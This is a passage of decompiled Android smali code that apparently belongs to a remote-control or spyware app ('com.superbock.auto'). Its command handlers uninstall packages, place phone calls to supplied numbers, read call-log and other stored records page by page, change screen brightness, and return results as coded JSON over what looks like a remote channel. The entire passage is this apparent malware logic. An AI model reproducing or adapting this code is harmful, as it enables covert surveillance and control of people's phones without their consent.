    invoke-virtual {v3}, Lz2/m;->b()Lz2/m;

    const-string v6, "co"

    const/4 v7, 0x3

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    invoke-virtual {v3, v6, v7}, Lz2/m;->i(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    invoke-virtual {v3}, Lz2/m;->j()Lz2/f;

    move-result-object v3

    invoke-interface {v0, v3}, Lt2/g;->i(Lz2/f;)J

    move-result-wide v6
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-wide v6, v4

    :goto_0
    cmp-long v0, v6, v4

    if-lez v0, :cond_2

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v0}, Lk3/f;->r(Landroid/content/Context;)V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v2, "16"

    invoke-static {v1, v2, v0}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    :cond_2
    if-nez v0, :cond_3

    const-string v0, "22"

    invoke-static {v1, v0, v2}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    :cond_3
    :goto_1
    return-void
.end method

.method public final N(ILjava/lang/String;)V
    .locals 6

    const/4 v0, 0x0

    const/4 v1, 0x1

    if-eqz p1, :cond_4

    const-string v2, "3"

    if-eq p1, v1, :cond_2

    const/4 v3, 0x2

    if-eq p1, v3, :cond_0

    goto/16 :goto_3

    :cond_0
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1}, Lk3/a;->i(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_1

    :goto_0
    invoke-static {v1, v2, v0}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :cond_1
    invoke-virtual {p0}, Lf3/i$a;->p0()V

    new-instance p1, Landroid/content/Intent;

    const-string v2, "android.intent.action.DELETE"

    invoke-direct {p1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "package:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-static {p2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p2

    invoke-virtual {p1, p2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/high16 p2, 0x10000000

    invoke-virtual {p1, p2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object p2, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {p2, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const-string p1, "43"

    :goto_1
    invoke-static {v1, p1, v0}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :cond_2
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1}, Lk3/a;->i(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_3

    goto :goto_0

    :cond_3
    :try_start_0
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1, p2}, Lk3/a;->l(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    const-string p1, "42"

    goto :goto_1

    :catch_0
    move-exception p1

    new-instance p2, Lf3/f;

    const-string v0, "17"

    invoke-direct {p2, v0, p1}, Lf3/f;-><init>(Ljava/lang/String;Ljava/lang/Throwable;)V

    throw p2

    :cond_4
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1, v1}, Lk3/f;->c(Landroid/content/Context;Z)V

    invoke-static {}, Lk3/f;->a()V

    invoke-static {}, Lg3/a;->b()Lg3/a;

    move-result-object p1

    invoke-static {p1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const-wide/16 v2, 0x0

    const/4 p2, 0x0

    :try_start_1
    iget-object p1, p1, Lg3/a;->b:Ljava/lang/Object;

    move-object v4, p1

    check-cast v4, Lt2/g;

    check-cast p1, Lt2/g;

    invoke-interface {p1}, Lt2/g;->c()Lz2/h;

    move-result-object p1

    iput-boolean v1, p1, Lz2/h;->l:Z

    invoke-virtual {p1}, Lz2/k;->g()Lz2/m;

    move-result-object p1

    const-string v1, "up"

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-virtual {p1, v1, v5}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    invoke-virtual {p1}, Lz2/m;->b()Lz2/m;

    const-string v1, "ty"

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-virtual {p1, v1, v5}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    invoke-virtual {p1}, Lz2/m;->j()Lz2/f;

    move-result-object p1

    invoke-interface {v4, p1}, Lt2/g;->i(Lz2/f;)J

    move-result-wide v4
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_2

    :catch_1
    move-wide v4, v2

    :goto_2
    cmp-long p1, v4, v2

    if-lez p1, :cond_5

    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1}, Lk3/f;->n(Landroid/content/Context;)V

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, ""

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "16"

    invoke-static {p2, v0, p1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    :cond_5
    if-nez p1, :cond_6

    const-string p1, "22"

    invoke-static {p2, p1, v0}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    :cond_6
    :goto_3
    return-void
.end method

.method public final O(Ls3/g0;IILjava/lang/String;Ljava/lang/String;)V
    .locals 10
    .param p1    # Ls3/g0;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param

    const-string v0, "na"

    const-string v1, "pk"

    const-string v2, "ti"

    const-string v3, "%"

    new-instance v4, Lf/e;

    invoke-direct {v4}, Lf/e;-><init>()V

    const/16 v5, 0x525

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "code"

    invoke-virtual {v4, v6, v5}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/j;->a()Lg3/j;

    move-result-object v5

    invoke-static {v5}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const/4 v6, 0x0

    :try_start_0
    iget-object v7, v5, Lg3/j;->b:Ljava/lang/Object;

    check-cast v7, Lt2/g;

    invoke-interface {v7}, Lt2/g;->c()Lz2/h;

    move-result-object v7

    const/4 v8, 0x1

    iput-boolean v8, v7, Lz2/h;->l:Z

    invoke-virtual {v7}, Lz2/k;->g()Lz2/m;

    move-result-object v8

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v9

    invoke-virtual {v8, v2, v9}, Lz2/m;->f(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    invoke-static {p4}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v9

    if-nez v9, :cond_0

    invoke-virtual {v8}, Lz2/m;->b()Lz2/m;

    invoke-virtual {v8, v1, p4}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_0
    invoke-static {p5}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v9

    if-nez v9, :cond_1

    invoke-virtual {v8}, Lz2/m;->b()Lz2/m;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, p5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v0, v9}, Lz2/m;->h(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_1
    iput-object v8, v7, Lz2/k;->g:Lz2/m;

    iget-object v5, v5, Lg3/j;->b:Ljava/lang/Object;

    check-cast v5, Lt2/g;

    invoke-virtual {v7}, Lz2/k;->f()La3/e;

    move-result-object v7

    invoke-interface {v5, v7}, Lt2/g;->i(Lz2/f;)J

    move-result-wide v7
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const-wide/16 v7, 0x0

    :goto_0
    invoke-static {v7, v8}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v5

    const-string v7, "total"

    invoke-virtual {v4, v7, v5}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/j;->a()Lg3/j;

    move-result-object v5

    add-int/lit8 p2, p2, -0x1

    mul-int p2, p2, p3

    int-to-long v7, p2

    int-to-long p2, p3

    invoke-static {v5}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    :try_start_1
    iget-object v9, v5, Lg3/j;->b:Ljava/lang/Object;

    check-cast v9, Lt2/g;

    invoke-interface {v9}, Lt2/g;->c()Lz2/h;

    move-result-object v9

    invoke-virtual {v9, v2, v6}, Lz2/h;->l(Ljava/lang/String;Z)Lz2/h;

    invoke-static {v7, v8}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v7

    invoke-virtual {v9, v7}, Lz2/h;->k(Ljava/lang/Long;)Lz2/h;

    invoke-static {p2, p3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p2

    iput-object p2, v9, Lz2/h;->m:Ljava/lang/Long;

    invoke-virtual {v9}, Lz2/k;->g()Lz2/m;

    move-result-object p2

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p3

    invoke-virtual {p2, v2, p3}, Lz2/m;->f(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    invoke-static {p4}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result p3

    if-nez p3, :cond_2

    invoke-virtual {p2}, Lz2/m;->b()Lz2/m;

    invoke-virtual {p2, v1, p4}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_2
    invoke-static {p5}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result p3

    if-nez p3, :cond_3

    invoke-virtual {p2}, Lz2/m;->b()Lz2/m;

    new-instance p3, Ljava/lang/StringBuilder;

    invoke-direct {p3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p3, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3, p5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    invoke-virtual {p2, v0, p3}, Lz2/m;->h(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_3
    iput-object p2, v9, Lz2/k;->g:Lz2/m;

    iget-object p2, v5, Lg3/j;->b:Ljava/lang/Object;

    check-cast p2, Lt2/g;

    invoke-virtual {v9}, Lz2/k;->f()La3/e;

    move-result-object p3

    invoke-interface {p2, p3}, Lt2/g;->k(Lz2/f;)Ljava/util/List;

    move-result-object p2
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception p2

    invoke-virtual {p2}, Ljava/lang/Throwable;->printStackTrace()V

    new-instance p2, Ljava/util/ArrayList;

    invoke-direct {p2}, Ljava/util/ArrayList;-><init>()V

    :goto_1
    const-string p3, "rows"

    invoke-virtual {v4, p3, p2}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v4}, Lf/a;->l()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, p2}, Ls3/g0;->b(Ljava/lang/String;)Z

    return-void
.end method

.method public final P(Ls3/g0;III)V
    .locals 8
    .param p1    # Ls3/g0;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param

    new-instance v0, Lf/e;

    invoke-direct {v0}, Lf/e;-><init>()V

    const/16 v1, 0x522

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "code"

    invoke-virtual {v0, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/h;->b()Lg3/h;

    move-result-object v1

    invoke-static {v1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "st"

    const/4 v3, 0x1

    if-lez p4, :cond_0

    :try_start_0
    iget-object v1, v1, Lg3/h;->a:Lt2/g;

    invoke-interface {v1}, Lt2/g;->c()Lz2/h;

    move-result-object v4

    iput-boolean v3, v4, Lz2/h;->l:Z

    invoke-virtual {v4}, Lz2/k;->g()Lz2/m;

    move-result-object v4

    invoke-static {p4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-virtual {v4, v2, v5}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    invoke-virtual {v4}, Lz2/m;->j()Lz2/f;

    move-result-object v4

    goto :goto_0

    :cond_0
    iget-object v1, v1, Lg3/h;->a:Lt2/g;

    invoke-interface {v1}, Lt2/g;->c()Lz2/h;

    move-result-object v4

    iput-boolean v3, v4, Lz2/h;->l:Z

    invoke-virtual {v4}, Lz2/k;->f()La3/e;

    move-result-object v4

    :goto_0
    invoke-interface {v1, v4}, Lt2/g;->i(Lz2/f;)J

    move-result-wide v4
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    const-wide/16 v4, 0x0

    :goto_1
    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    const-string v4, "total"

    invoke-virtual {v0, v4, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/h;->b()Lg3/h;

    move-result-object v1

    sub-int/2addr p2, v3

    mul-int p2, p2, p3

    int-to-long v3, p2

    int-to-long p2, p3

    invoke-static {v1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const/4 v5, 0x0

    const-string v6, "ti"

    if-lez p4, :cond_1

    :try_start_1
    iget-object v1, v1, Lg3/h;->a:Lt2/g;

    invoke-interface {v1}, Lt2/g;->c()Lz2/h;

    move-result-object v7

    invoke-virtual {v7, v6, v5}, Lz2/h;->l(Ljava/lang/String;Z)Lz2/h;

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v3

    invoke-virtual {v7, v3}, Lz2/h;->k(Ljava/lang/Long;)Lz2/h;

    invoke-static {p2, p3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p2

    iput-object p2, v7, Lz2/h;->m:Ljava/lang/Long;

    invoke-virtual {v7}, Lz2/k;->g()Lz2/m;

    move-result-object p2

    invoke-static {p4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p3

    invoke-virtual {p2, v2, p3}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    invoke-virtual {p2}, Lz2/m;->j()Lz2/f;

    move-result-object p2

    invoke-interface {v1, p2}, Lt2/g;->k(Lz2/f;)Ljava/util/List;

    move-result-object p2

    goto :goto_2

    :cond_1
    iget-object p4, v1, Lg3/h;->a:Lt2/g;

    invoke-interface {p4}, Lt2/g;->c()Lz2/h;

    move-result-object v1

    invoke-virtual {v1, v6, v5}, Lz2/h;->l(Ljava/lang/String;Z)Lz2/h;

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    invoke-virtual {v1, v2}, Lz2/h;->k(Ljava/lang/Long;)Lz2/h;

    invoke-static {p2, p3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p2

    iput-object p2, v1, Lz2/h;->m:Ljava/lang/Long;

    invoke-virtual {v1}, Lz2/k;->f()La3/e;

    move-result-object p2

    invoke-interface {p4, p2}, Lt2/g;->k(Lz2/f;)Ljava/util/List;

    move-result-object p2
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_2

    :catch_1
    move-exception p2

    invoke-virtual {p2}, Ljava/lang/Throwable;->printStackTrace()V

    new-instance p2, Ljava/util/ArrayList;

    invoke-direct {p2}, Ljava/util/ArrayList;-><init>()V

    :goto_2
    const-string p3, "rows"

    invoke-virtual {v0, p3, p2}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v0}, Lf/a;->l()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, p2}, Ls3/g0;->b(Ljava/lang/String;)Z

    return-void
.end method

.method public final Q(ILjava/lang/String;)V
    .locals 1

    if-nez p1, :cond_1

    sget-boolean p1, Lcom/superbock/auto/BaseService;->z:Z

    const/4 p2, 0x0

    if-nez p1, :cond_0

    invoke-static {p2}, Lf3/i;->d(Z)V

    goto :goto_1

    :cond_0
    sput-boolean p2, Lcom/superbock/auto/BaseService;->z:Z

    :goto_0
    sget-object p1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object p1, Lcom/superbock/auto/BaseService;->C:Ljava/lang/Boolean;

    invoke-static {}, Lf3/i;->o()V

    goto :goto_1

    :cond_1
    const/4 v0, 0x1

    if-ne p1, v0, :cond_3

    sget-boolean p1, Lcom/superbock/auto/BaseService;->z:Z

    if-eqz p1, :cond_2

    invoke-static {v0}, Lf3/i;->d(Z)V

    goto :goto_1

    :cond_2
    sput-object p2, Lcom/superbock/auto/BaseService;->A:Ljava/lang/String;

    sput-boolean v0, Lcom/superbock/auto/BaseService;->z:Z

    goto :goto_0

    :cond_3
    :goto_1
    return-void
.end method

.method public final R(Ls3/g0;I)V
    .locals 4
    .param p1    # Ls3/g0;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    const-string v0, "screen_brightness_mode"

    iget-object v1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v1}, Landroid/provider/Settings$System;->canWrite(Landroid/content/Context;)Z

    move-result v1

    const/4 v2, 0x1

    if-nez v1, :cond_1

    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1}, Lk3/a;->i(Landroid/content/Context;)Z

    move-result p1

    const/4 p2, 0x0

    if-eqz p1, :cond_0

    const-string p1, "3"

    goto :goto_0

    :cond_0
    invoke-virtual {p0}, Lf3/i$a;->p0()V

    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.settings.action.MANAGE_WRITE_SETTINGS"

    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v0, 0x10000000

    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v0, "package:"

    invoke-static {v0}, Landroidx/activity/d;->g(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const-string p1, "4"

    :goto_0
    invoke-static {v2, p1, p2}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_1
    :try_start_0
    iget-object v1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    invoke-static {v1, v0}, Landroid/provider/Settings$System;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;)I

    move-result v1

    const/4 v3, 0x0

    if-ne v1, v2, :cond_2

    iget-object v1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    invoke-static {v1, v0, v3}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_0
    .catch Landroid/provider/Settings$SettingNotFoundException; {:try_start_0 .. :try_end_0} :catch_1

    :cond_2
    const/16 v0, 0x64

    if-gez p2, :cond_3

    const/4 p2, 0x0

    goto :goto_1

    :cond_3
    if-le p2, v0, :cond_4

    const/16 p2, 0x64

    :cond_4
    :goto_1
    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "screen_brightness"

    invoke-static {v0, v1, p2}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    iget-object p2, p0, Lf3/i$a;->h:Landroid/content/Context;

    :try_start_1
    invoke-virtual {p2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object p2

    invoke-static {p2, v1}, Landroid/provider/Settings$System;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;)I

    move-result p2
    :try_end_1
    .catch Landroid/provider/Settings$SettingNotFoundException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    :catch_0
    const/4 p2, -0x1

    :goto_2
    if-ltz p2, :cond_5

    new-instance v0, Lf/e;

    invoke-direct {v0}, Lf/e;-><init>()V

    const/16 v1, 0x4b7

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "code"

    invoke-virtual {v0, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p2

    const-string v1, "brightness"

    invoke-virtual {v0, v1, p2}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v0}, Lf/a;->l()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, p2}, Ls3/g0;->b(Ljava/lang/String;)Z

    :cond_5
    return-void

    :catch_1
    move-exception p1

    new-instance p2, Lf3/f;

    const-string v0, "8"

    invoke-direct {p2, v0, p1}, Lf3/f;-><init>(Ljava/lang/String;Ljava/lang/Throwable;)V

    throw p2
.end method

.method public final S(ILjava/lang/String;)V
    .locals 7

    const-string v0, "38"

    const/4 v1, 0x0

    const/4 v2, 0x1

    if-eqz p1, :cond_3

    if-eq p1, v2, :cond_0

    goto/16 :goto_2

    :cond_0
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v3, "android.permission.CALL_PHONE"

    invoke-static {p1, v3}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_1

    :goto_0
    invoke-static {v2, v0, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_2

    :cond_1
    const-string p1, "#"

    invoke-virtual {p2, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-static {p1}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, p1, v0}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    :cond_2
    new-instance p1, Landroid/content/Intent;

    invoke-direct {p1}, Landroid/content/Intent;-><init>()V

    const-string v0, "android.intent.action.CALL"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "tel:"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-static {p2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p2

    invoke-virtual {p1, p2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/high16 p2, 0x10000000

    invoke-virtual {p1, p2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object p2, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {p2, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_2

    :cond_3
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string p2, "android.permission.READ_CALL_LOG"

    invoke-static {p1, p2}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_4

    goto :goto_0

    :cond_4
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1, v2}, Lk3/f;->e(Landroid/content/Context;Z)V

    invoke-static {}, Lg3/e;->a()Lg3/e;

    move-result-object p1

    invoke-static {p1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const-wide/16 v3, 0x0

    const/4 p2, 0x0

    :try_start_0
    iget-object p1, p1, Lg3/e;->a:Lt2/g;

    invoke-interface {p1}, Lt2/g;->c()Lz2/h;

    move-result-object v0

    iput-boolean v2, v0, Lz2/h;->l:Z

    invoke-virtual {v0}, Lz2/k;->g()Lz2/m;

    move-result-object v0

    const-string v2, "up"

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-virtual {v0, v2, v5}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    invoke-virtual {v0}, Lz2/m;->j()Lz2/f;

    move-result-object v0

    invoke-interface {p1, v0}, Lt2/g;->i(Lz2/f;)J

    move-result-wide v5
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-wide v5, v3

    :goto_1
    cmp-long p1, v5, v3

    if-lez p1, :cond_5

    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1}, Lk3/f;->p(Landroid/content/Context;)V

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, ""

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

